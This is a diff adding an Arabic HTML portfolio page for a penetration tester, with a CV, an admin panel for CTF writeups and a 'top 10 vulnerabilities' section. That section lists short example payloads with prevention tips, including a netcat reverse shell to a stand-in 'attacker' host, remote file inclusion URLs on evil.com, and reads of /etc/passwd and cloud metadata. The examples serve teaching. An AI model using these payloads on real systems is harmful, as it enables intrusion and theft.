@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/all.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="icon" href="image/icon.ico">
+    <title>ZODiAK | مختبر اختراق</title>
+    <style>
+        /* تحسينات إضافية */
+        .upload-area {
+            border: 2px dashed var(--accent-cyan);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 15px 0;
+        }
+        .upload-area:hover {
+            border-color: var(--accent-purple);
+            background: rgba(0,255,255,0.05);
+        }
+        .preview-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .preview-item {
+            position: relative;
+            border: 2px solid var(--accent-cyan);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .preview-item img, .preview-item video {
+            width: 100%;
+            height: 120px;
+            object-fit: cover;
+        }
+        .remove-media {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: rgba(255,0,85,0.8);
+            border: none;
+            color: white;
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .step-card {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-right: 3px solid var(--accent-green);
+        }
+        .certs-display-grid, .projects-display-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .cert-card, .project-card {
+            background: rgba(15,20,25,0.8);
+            border-radius: 15px;
+            overflow: hidden;
+            transition: 0.3s;
+            cursor: pointer;
+        }
+        .cert-card:hover, .project-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px var(--accent-purple);
+        }
+        .cert-card img, .project-card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+        }
+        .cert-info, .project-info {
+            padding: 15px;
+        }
+        .cert-name, .project-name {
+            color: var(--accent-cyan);
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        .cert-issuer, .project-category {
+            color: var(--accent-yellow);
+            font-size: 0.85rem;
+        }
+        .admin-badge {
+            background: var(--accent-green);
+            color: black;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="scene-3d"><div class="grid-3d"></div></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+
+    <!-- شريط التنقل -->
+    <nav class="navbar">
+        <div class="nav-left">
+            <div class="logo">┌─[ZODiAK]─[~]</div>
+            <div class="menu-toggle" onclick="toggleMenu()">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="nav-links" id="navLinks">
+            <a href="#home" data-translate="nav-home">الرئيسية</a>
+            <a href="#cv" data-translate="nav-cv">السيرة</a>
+            <a href="#certificates-section" data-translate="nav-certs">الشهادات</a>
+            <a href="#projects-section" data-translate="nav-projects">المشاريع</a>
+            <a href="#machine-writeups" data-translate="nav-writeups">الرايت اب</a>
+            <a href="#vuln" data-translate="nav-vuln">الثغرات</a>
+            <a href="#blog" data-translate="nav-blog">المدونة</a>
+            <a href="#contact" data-translate="nav-contact">تواصل</a>
+        </div>
+        <div class="lang-switch">
+            <button class="lang-btn" id="lang-ar" onclick="setLang('ar')">عربي</button>
+            <button class="lang-btn" id="lang-en" onclick="setLang('en')">English</button>
+        </div>
+    </nav>
+
+    <!-- زر الدخول للأدمن -->
+    <button class="admin-login-btn" onclick="openAdminModal()" id="adminLoginBtn">🔑 ADMIN LOGIN</button>
+
+    <!-- مودال تسجيل الدخول -->
+    <div class="modal" id="adminModal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeAdminModal()">&times;</span>
+            <h2 style="color: var(--accent-red); margin-bottom: 20px;" data-translate="login-title">دخول الأدمن</h2>
+            <input type="password" class="modal-input" id="adminPass" data-translate="login-placeholder" placeholder="كلمة السر" onkeypress="checkEnter(event)">
+            <button class="modal-btn" onclick="adminLogin()" data-translate="login-button">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <!-- لوحة تحكم الأدمن -->
+    <div class="admin-panel" id="adminPanel">
+        <h2 style="color: var(--accent-green); text-align: center; margin-bottom: 30px;">🔰 لوحة تحكم الأدمن</h2>
+        
+        <div class="admin-tabs">
+            <button class="admin-tab" onclick="switchAdminTab('certs')">🏆 الشهادات</button>
+            <button class="admin-tab" onclick="switchAdminTab('projects')">📁 المشاريع</button>
+            <button class="admin-tab" onclick="switchAdminTab('machines')">🖥️ رايت اب</button>
+            <button class="admin-tab" onclick="switchAdminTab('writeups-stats')">📊 إحصائيات</button>
+            <button class="admin-tab" onclick="switchAdminTab('blog')">📝 مقالات</button>
+            <button class="admin-tab" onclick="logoutAdmin()">🚪 خروج</button>
+        </div>
+
+        <!-- ==================== إدارة الشهادات ==================== -->
+        <div class="admin-form" id="certsForm">
+            <h3 style="color: var(--accent-cyan); margin-bottom: 20px;">🏆 إضافة شهادة جديدة</h3>
+            
+            <div style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; margin-bottom: 30px;">
+                <input type="text" class="admin-input" id="certName" placeholder="اسم الشهادة (مثال: OSCP)">
+                <input type="text" class="admin-input" id="certIssuer" placeholder="الجهة المانحة (مثال: Offensive Security)">
+                <input type="text" class="admin-input" id="certDate" placeholder="تاريخ الحصول (مثال: 2024)">
+                <input type="url" class="admin-input" id="certLink" placeholder="رابط التحقق (اختياري)">
+                <textarea class="admin-input" id="certDesc" placeholder="وصف الشهادة" rows="3"></textarea>
+                <input type="text" class="admin-input" id="certSkills" placeholder="المهارات (مفصولة بفواصل) مثال: Linux,Windows,PrivEsc">
+                
+                <!-- رفع الصورة من الجهاز -->
+                <div class="upload-area" onclick="document.getElementById('certImageInput').click()">
+                    📸 اضغط لرفع صورة الشهادة من جهازك
+                    <input type="file" id="certImageInput" accept="image/*" style="display: none;" onchange="previewAndSaveImage(this, 'certImagePreview', 'certImageData')">
+                </div>
+                <input type="hidden" id="certImageData">
+                <div id="certImagePreview" style="margin-top: 10px;"></div>
+                
+                <button class="admin-tab" onclick="addCertificate()" style="background: var(--accent-green); color: black; margin-top: 15px;">✅ إضافة شهادة</button>
+            </div>
+            
+            <h3 style="color: var(--accent-yellow); margin-bottom: 15px;">📋 الشهادات الحالية</h3>
+            <div id="certificatesList"></div>
+        </div>
+
+        <!-- ==================== إدارة المشاريع ==================== -->
+        <div class="admin-form" id="projectsForm">
+            <h3 style="color: var(--accent-cyan); margin-bottom: 20px;">📁 إضافة مشروع جديد</h3>
+            
+            <div style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; margin-bottom: 30px;">
+                <input type="text" class="admin-input" id="projectName" placeholder="اسم المشروع">
+                <input type="text" class="admin-input" id="projectCategory" placeholder="التصنيف (مثال: Web Security)">
+                <input type="text" class="admin-input" id="projectDate" placeholder="التاريخ (مثال: 2024)">
+                <textarea class="admin-input" id="projectDesc" placeholder="وصف المشروع" rows="3"></textarea>
+                <input type="text" class="admin-input" id="projectTech" placeholder="التقنيات (مفصولة بفواصل) مثال: Python,JavaScript">
+                <input type="url" class="admin-input" id="projectGithub" placeholder="رابط GitHub">
+                <select class="admin-select" id="projectStatus">
+                    <option value="completed">✅ مكتمل</option>
+                    <option value="in-progress">🔄 قيد التطوير</option>
+                    <option value="planned">📝 مخطط له</option>
+                </select>
+                <textarea class="admin-input" id="projectFeatures" placeholder="المميزات (كل ميزة في سطر)" rows="4"></textarea>
+                
+                <!-- رفع الصورة من الجهاز -->
+                <div class="upload-area" onclick="document.getElementById('projectImageInput').click()">
+                    📸 اضغط لرفع صورة المشروع من جهازك
+                    <input type="file" id="projectImageInput" accept="image/*" style="display: none;" onchange="previewAndSaveImage(this, 'projectImagePreview', 'projectImageData')">
+                </div>
+                <input type="hidden" id="projectImageData">
+                <div id="projectImagePreview" style="margin-top: 10px;"></div>
+                
+                <button class="admin-tab" onclick="addProject()" style="background: var(--accent-green); color: black; margin-top: 15px;">✅ إضافة مشروع</button>
+            </div>
+            
+            <h3 style="color: var(--accent-yellow); margin-bottom: 15px;">📋 المشاريع الحالية</h3>
+            <div id="projectsList"></div>
+        </div>
+
+        <!-- ==================== إدارة رايت اب الماكينات ==================== -->
+        <div class="admin-form" id="machinesForm">
+            <h3 style="color: var(--accent-cyan); margin-bottom: 20px;">🖥️ إضافة رايت اب ماكينة</h3>
+            
+            <div style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; margin-bottom: 30px;">
+                <input type="text" class="admin-input" id="machineName" placeholder="اسم الماكينة (مثال: Lame)">
+                <select class="admin-select" id="machinePlatform">
+                    <option value="HackTheBox">HackTheBox</option>
+                    <option value="TryHackMe">TryHackMe</option>
+                    <option value="PortSwigger">PortSwigger</option>
+                    <option value="VulnHub">VulnHub</option>
+                </select>
+                <select class="admin-select" id="machineDifficulty">
+                    <option value="easy">سهل</option>
+                    <option value="medium">متوسط</option>
+                    <option value="hard">صعب</option>
+                    <option value="insane">جنوني</option>
+                </select>
+                <input type="text" class="admin-input" id="machineDate" placeholder="التاريخ (مثال: 2024-01-15)">
+                <textarea class="admin-input" id="machineDesc" placeholder="وصف الماكينة" rows="3"></textarea>
+                <input type="text" class="admin-input" id="machineTags" placeholder="الوسوم (مفصولة بفواصل)">
+                <textarea class="admin-input" id="machineCommands" placeholder="الأوامر المستخدمة (كل أمر في سطر)" rows="5"></textarea>
+                <textarea class="admin-input" id="machineWalkthrough" placeholder="الشرح الكامل" rows="10"></textarea>
+                
+                <!-- خطوات الاختراق مع رفع الصور -->
+                <h4 style="color: var(--accent-cyan); margin: 15px 0;">📸 خطوات الاختراق (صور وفيديوهات)</h4>
+                <div id="stepsContainer"></div>
+                <button type="button" class="admin-tab" onclick="addStepField()" style="background: var(--accent-purple); margin-top: 10px;">➕ إضافة خطوة</button>
+                
+                <button class="admin-tab" onclick="addMachineWriteup()" style="background: var(--accent-green); color: black; margin-top: 20px;">✅ إضافة رايت اب</button>
+            </div>
+            
+            <h3 style="color: var(--accent-yellow); margin-bottom: 15px;">📋 رايت اب الماكينات الحالية</h3>
+            <div id="machinesList"></div>
+        </div>
+
+        <!-- ==================== إحصائيات المنصات ==================== -->
+        <div class="admin-form" id="writeupsStatsForm">
+            <h3 style="color: var(--accent-cyan); margin-bottom: 20px;">📊 عدد الماكينات المحلولة</h3>
+            <div id="platformStatsEditor"></div>
+            <button class="admin-tab" onclick="savePlatformStats()" style="background: var(--accent-green); color: black; margin-top: 20px;">💾 حفظ الإحصائيات</button>
+        </div>
+
+        <!-- ==================== إدارة المقالات ==================== -->
+        <div class="admin-form" id="blogForm">
+            <h3 style="color: var(--accent-cyan); margin-bottom: 20px;">📝 إضافة مقال جديد</h3>
+            
+            <div style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px;">
+                <input type="text" class="admin-input" id="blogTitle" placeholder="عنوان المقال">
+                <select class="admin-select" id="blogPlatform">
+                    <option value="Blog">مدونة</option>
+                    <option value="HackTheBox">HackTheBox</option>
+                    <option value="TryHackMe">TryHackMe</option>
+                </select>
+                <textarea class="admin-input" id="blogContent" placeholder="محتوى المقال" rows="10"></textarea>
+                <input type="text" class="admin-input" id="blogTags" placeholder="الوسوم (مفصولة بفواصل)">
+                
+                <!-- رفع صور وفيديوهات متعددة -->
+                <div class="upload-area" onclick="document.getElementById('blogMediaInput').click()">
+                    📸 اضغط لرفع صور/فيديوهات من جهازك
+                    <input type="file" id="blogMediaInput" accept="image/*,video/*" multiple style="display: none;" onchange="handleBlogMediaUpload(this)">
+                </div>
+                <div id="blogMediaPreview" class="preview-grid"></div>
+                
+                <button class="admin-tab" onclick="addBlogPost()" style="background: var(--accent-green); color: black; margin-top: 15px;">📝 نشر المقال</button>
+            </div>
+            
+            <h3 style="color: var(--accent-yellow); margin: 30px 0 15px;">📋 المقالات المنشورة</h3>
+            <div id="blogPostsList"></div>
+        </div>
+    </div>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="container">
+        <!-- الهيدر -->
+        <section id="home" class="hero">
+            <h1 data-translate="hero-name">HAMMAD ELSAYED - Pentester</h1>
+            <p data-translate="hero-command">#!/bin/bash - "Hack The Planet"</p>
+            <p style="margin-top: 20px;" data-translate="hero-desc">مختبر اختراق | OSCP | CEH | CTF Player</p>
+        </section>
+
+        <!-- المهارات -->
+        <div class="skills-grid">
+            <div class="skill-card"><div class="skill-icon">🌐</div><h3 data-translate="skill-web">اختبار الاختراق للويب</h3><p data-translate="skill-web-desc">SQLi, XSS, CSRF, SSRF</p></div>
+            <div class="skill-card"><div class="skill-icon">🔓</div><h3 data-translate="skill-network">أمن الشبكات</h3><p data-translate="skill-network-desc">Nmap, Metasploit, Wireshark</p></div>
+            <div class="skill-card"><div class="skill-icon">💻</div><h3 data-translate="skill-reverse">الهندسة العكسية</h3><p data-translate="skill-reverse-desc">Ghidra, IDA, x86/x64</p></div>
+            <div class="skill-card"><div class="skill-icon">🔐</div><h3 data-translate="skill-crypto">التشفير</h3><p data-translate="skill-crypto-desc">RSA, AES, Hashing</p></div>
+        </div>
+
+        <!-- السيرة الذاتية -->
+        <section id="cv">
+            <h1 data-translate="cv-title">┌─[CV]─[السيرة الذاتية]</h1>
+            <div class="cv-container">
+                <div class="cv-header">
+                    <div class="cv-profile">
+                        <div class="cv-avatar"><img src="image/photo.jpg" alt="HAMMAD ELSAYED"></div>
+                        <div class="cv-header-info">
+                            <div class="cv-name" data-translate="cv-name">HAMMAD ELSAYED</div>
+                            <div class="cv-title" data-translate="cv-job">Penetration Tester</div>
+                            <div class="cv-location"><span>📍 <span data-translate="cv-location">مصر، الغربية</span></span><span>📧 zodiak0x6@gmail.com</span></div>
+                        </div>
+                    </div>
+                    <button class="admin-tab download-cv" onclick="downloadCV()" style="border-color: var(--accent-purple); color: var(--accent-purple);">📥 <span data-translate="cv-download">تحميل CV</span></button>
+                </div>
+                <div class="cv-section"><h3 data-translate="cv-summary">ملخص احترافي</h3><div class="cv-summary" data-translate="cv-summary-text">باحث أمني ومختبر اختراق، مؤسس فريق BLACK V الأمني.</div></div>
+                <div class="cv-section"><h3 data-translate="cv-experience">الخبرات المهنية</h3>
+                    <div class="cv-timeline">
+                        <div class="cv-item"><div class="cv-item-year">2024 - 2026</div><div class="cv-item-content"><h4 data-translate="cv-exp1-title">Cybersecurity Researcher</h4><div class="cv-item-company">BLACK V Team</div><ul class="cv-item-desc"><li>اختبار اختراق تطبيقات الويب</li><li>تطوير أدوات أتمتة</li><li>توثيق التقارير الفنية</li></ul></div></div>
+                        <div class="cv-item"><div class="cv-item-year">2024 - 2026</div><div class="cv-item-content"><h4 data-translate="cv-exp2-title">Pentester & Developer</h4><div class="cv-item-company">Front-End, Python</div><ul class="cv-item-desc"><li>تطوير مختبر ويب ضعيف</li><li>إدارة بيئات افتراضية</li><li>بحث في تشفير الهاردوير</li></ul></div></div>
+                    </div>
+                </div>
+                <div class="cv-section"><h3 data-translate="cv-education">التعليم</h3><div class="cv-item"><div class="cv-item-year">2026</div><div class="cv-item-content"><h4 data-translate="cv-edu-title">جامعة الازهر</h4><div class="cv-item-company">كلية الشريعة والقانون</div></div></div></div>
+                <div class="cv-section"><h3 data-translate="cv-skills-title">المهارات التقنية</h3>
+                    <div class="skills-progress">
+                        <div class="skill-progress-item"><span class="skill-name">Web Penetration Testing</span><div class="progress-bar"><div class="progress-fill" style="width: 90%"></div></div><span class="skill-percent">90%</span></div>
+                        <div class="skill-progress-item"><span class="skill-name">Network Security</span><div class="progress-bar"><div class="progress-fill" style="width: 85%"></div></div><span class="skill-percent">85%</span></div>
+                        <div class="skill-progress-item"><span class="skill-name">Python Scripting</span><div class="progress-bar"><div class="progress-fill" style="width: 80%"></div></div><span class="skill-percent">80%</span></div>
+                    </div>
+                </div>
+                <div class="cv-section"><h3 data-translate="cv-languages">اللغات</h3><div class="languages-grid"><div class="language-item"><span class="language-name" data-translate="lang-arabic">العربية</span><span class="language-level" data-translate="lang-native">اللغة الأم</span></div><div class="language-item"><span class="language-name" data-translate="lang-english">الإنجليزية</span><span class="language-level" data-translate="lang-fluent">متوسط (B1)</span></div></div></div>
+            </div>
+        </section>
+
+        <!-- عرض الشهادات -->
+        <section id="certificates-section">
+            <h1>┌─[CERTIFICATES]─[الشهادات]</h1>
+            <div class="certs-display-grid" id="certificatesDisplayGrid"></div>
+        </section>
+
+        <!-- عرض المشاريع -->
+        <section id="projects-section">
+            <h1>┌─[PROJECTS]─[المشاريع]</h1>
+            <div class="projects-display-grid" id="projectsDisplayGrid"></div>
+        </section>
+
+        <!-- إحصائيات المنصات -->
+        <section id="platform-stats">
+            <h1>┌─[STATS]─[الماكينات المحلولة]</h1>
+            <div class="stats-container" id="platformStatsContainer"></div>
+        </section>
+
+        <!-- رايت اب الماكينات -->
+        <section id="machine-writeups">
+            <h1 data-translate="machine-writeups-title">┌─[MACHINES]─[رايت اب الماكينات]</h1>
+            <div class="writeups-grid" id="machineWriteupsGrid"></div>
+        </section>
+
+        <!-- أهم 10 ثغرات -->
+        <section id="vuln">
+            <h1 data-translate="vuln-title">┌─[TOP 10]─[أهم الثغرات]</h1>
+            
+            <div class="vuln-grid">
+                <!-- 1. SQL Injection -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">SQL Injection</span>
+                        <span class="severity critical">CRITICAL</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 9.8</span>
+                        <span>📌 CWE-89</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-sql">حقن SQL - المهاجم ينفذ أوامر SQL خبيثة في قاعدة البيانات</div>
+                    <div class="vuln-example">
+                        ' OR '1'='1' -- <br>
+                        admin'-- <br>
+                        ' UNION SELECT * FROM users--
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-sql">✅ استخدم Prepared Statements</div>
+                </div>
+
+                <!-- 2. XSS -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">Cross-Site Scripting (XSS)</span>
+                        <span class="severity high">HIGH</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 8.2</span>
+                        <span>📌 CWE-79</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-xss">حقن سكريبتات خبيثة في صفحات الويب</div>
+                    <div class="vuln-example">
+                        &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+                        &lt;img src=x onerror=alert(1)&gt;
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-xss">✅ تشفير المخرجات - Content Security Policy</div>
+                </div>
+
+                <!-- 3. CSRF -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">CSRF</span>
+                        <span class="severity medium">MEDIUM</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 6.5</span>
+                        <span>📌 CWE-352</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-csrf">تزوير الطلبات عبر المواقع - تنفيذ أوامر بدون علم المستخدم</div>
+                    <div class="vuln-example">
+                        &lt;img src="http://bank.com/transfer?amount=1000&to=hacker"&gt;
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-csrf">✅ CSRF Tokens - SameSite Cookies</div>
+                </div>
+
+                <!-- 4. LFI -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">Local File Inclusion</span>
+                        <span class="severity high">HIGH</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 7.5</span>
+                        <span>📌 CWE-98</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-lfi">قراءة ملفات حساسة من السيرفر</div>
+                    <div class="vuln-example">
+                        ../../../../etc/passwd<br>
+                        php://filter/convert.base64-encode/resource=index.php
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-lfi">✅ التحقق من المدخلات - Whitelist</div>
+                </div>
+
+                <!-- 5. RFI -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">Remote File Inclusion</span>
+                        <span class="severity critical">CRITICAL</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 9.0</span>
+                        <span>📌 CWE-98</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-rfi">تضمين ملفات خارجية خبيثة</div>
+                    <div class="vuln-example">
+                        http://evil.com/shell.txt?<br>
+                        ftp://hacker.com/backdoor.php
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-rfi">✅ تعطيل allow_url_include</div>
+                </div>
+
+                <!-- 6. Command Injection -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">Command Injection</span>
+                        <span class="severity critical">CRITICAL</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 9.9</span>
+                        <span>📌 CWE-77</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-cmd">تنفيذ أوامر على نظام التشغيل</div>
+                    <div class="vuln-example">
+                        127.0.0.1; cat /etc/passwd<br>
+                        | dir<br>
+                        &amp;&amp; nc -e /bin/sh attacker 4444
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-cmd">✅ escapeshellcmd() - escapeshellarg()</div>
+                </div>
+
+                <!-- 7. IDOR -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">IDOR</span>
+                        <span class="severity medium">MEDIUM</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 5.3</span>
+                        <span>📌 CWE-639</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-idor">الوصول المباشر غير المصرح به للكائنات</div>
+                    <div class="vuln-example">
+                        /user/123 -> /user/124<br>
+                        /download?file=1.pdf -> /download?file=2.pdf
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-idor">✅ التحقق من الصلاحيات لكل طلب</div>
+                </div>
+
+                <!-- 8. XXE -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">XXE</span>
+                        <span class="severity high">HIGH</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 7.8</span>
+                        <span>📌 CWE-611</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-xxe">ثغرة في معالجة XML</div>
+                    <div class="vuln-example">
+                        &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br>
+                        &lt;foo&gt;&xxe;&lt;/foo&gt;
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-xxe">✅ تعطيل XXE في معالج XML</div>
+                </div>
+
+                <!-- 9. SSRF -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">SSRF</span>
+                        <span class="severity high">HIGH</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 8.0</span>
+                        <span>📌 CWE-918</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-ssrf">إجبار السيرفر على عمل طلبات داخلية</div>
+                    <div class="vuln-example">
+                        http://169.254.169.254/latest/meta-data/<br>
+                        http://localhost:8080/admin
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-ssrf">✅ Whitelist للـ URLs المسموح بها</div>
+                </div>
+
+                <!-- 10. Broken Authentication -->
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <span class="vuln-title">Broken Authentication</span>
+                        <span class="severity critical">CRITICAL</span>
+                    </div>
+                    <div class="vuln-meta">
+                        <span>⚡ CVSS: 9.1</span>
+                        <span>📌 CWE-287</span>
+                    </div>
+                    <div class="vuln-desc" data-translate="vuln-desc-auth">ثغرات في نظام المصادقة</div>
+                    <div class="vuln-example">
+                        admin:admin<br>
+                        brute force attacks<br>
+                        session fixation
+                    </div>
+                    <div class="vuln-prevention" data-translate="vuln-prevention-auth">✅ MFA - قفل الحساب - كلمات مرور قوية</div>
+                </div>
+            </div>
+        </section>
+        <!-- مقالات المدونة -->
+        <section id="blog">
+            <h1 data-translate="blog-title">┌─[BLOG]─[مقالات تقنية]</h1>
+            <div class="blog-grid" id="blogGrid"></div>
+        </section>
+
+        <!-- التواصل -->
+        <section id="contact">
+            <h1 data-translate="contact-title">┌─[CONTACT]─[تواصل معي]</h1>
+            <div class="contact-grid">
+                <div class="contact-info">
+                    <!-- <a href="https://discord.gg/wptz8m4YH" target="_blank" class="social-link">🎮 Discord</a> -->
+                    <!-- <a href="https://github.com/ixZODiAK/" target="_blank" class="social-link">🐙 GitHub</a> -->
+                    <a href="https://www.linkedin.com/in/ebrahim-hammad-072307330" target="_blank" class="social-link">🔗 LinkedIn</a><br>
+                    <!-- <a href="https://x.com/zodiakx_x" target="_blank" class="social-link">🐦 Twitter (X)</a> -->
+                    <!-- <a href="https://www.instagram.com/ixzodiakx_x" target="_blank" class="social-link">📷 Instagram</a> -->
+                    <a href="https://tryhackme.com/p/ZODiAKfromBlackVTeam" target="_blank" class="social-link">💻 TryHackMe</a><br>
+                    <a href="https://app.hackthebox.com/users/2369804" target="_blank" class="social-link">🐧 HackTheBox</a><br>
+                </div>
+                <div class="contact-info">
+                    <h3 style="color: var(--accent-cyan); margin-bottom: 20px;" data-translate="send-message">أرسل رسالة</h3>
+                    <div id="formMessage" style="display: none; margin-bottom: 20px; padding: 15px; border-radius: 10px;"></div>
+                    <form id="contactForm" onsubmit="sendEmail(event)">
+                        <input type="text" class="admin-input" id="fromName" data-translate="your-name" placeholder="اسمك" required>
+                        <input type="email" class="admin-input" id="fromEmail" data-translate="your-email" placeholder="بريدك" required>
+                        <textarea class="admin-input" id="message" data-translate="your-message" placeholder="رسالتك" rows="5" required></textarea>
+                        <button type="submit" class="admin-tab" style="width: 100%;" id="sendBtn" data-translate="send">إرسال</button>
+                    </form>
+                </div>
+            </div>
+            <div class="social-links">
+                <a href="https://discord.gg/wptz8m4YH" target="_blank" class="social-link">🎮 Discord</a>
+                <a href="https://github.com/ixZODiAK/" target="_blank" class="social-link">🐙 GitHub</a>
+                <a href="https://www.linkedin.com/in/ebrahim-hammad-072307330" target="_blank" class="social-link">🔗 LinkedIn</a>
+                <a href="https://x.com/zodiakx_x" target="_blank" class="social-link">🐦 Twitter (X)</a>
+                <a href="https://www.instagram.com/ixzodiakx_x" target="_blank" class="social-link">📷 Instagram</a>
+                <a href="https://tryhackme.com/p/ZODiAKfromBlackVTeam" target="_blank" class="social-link">💻 TryHackMe</a>
+                <a href="https://app.hackthebox.com/users/2369804" target="_blank" class="social-link">🐧 HackTheBox</a>
+            </div>
+        </section>
+
+        <footer><p data-translate="footer">© 2026 HAMMAD ELSAYED - مختبر اختراق</p><p style="color: var(--text-secondary); margin-top: 10px;" data-translate="footer-quote">#HackThePlanet</p></footer>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="js/script.js"></script>
+</body>
+</html>
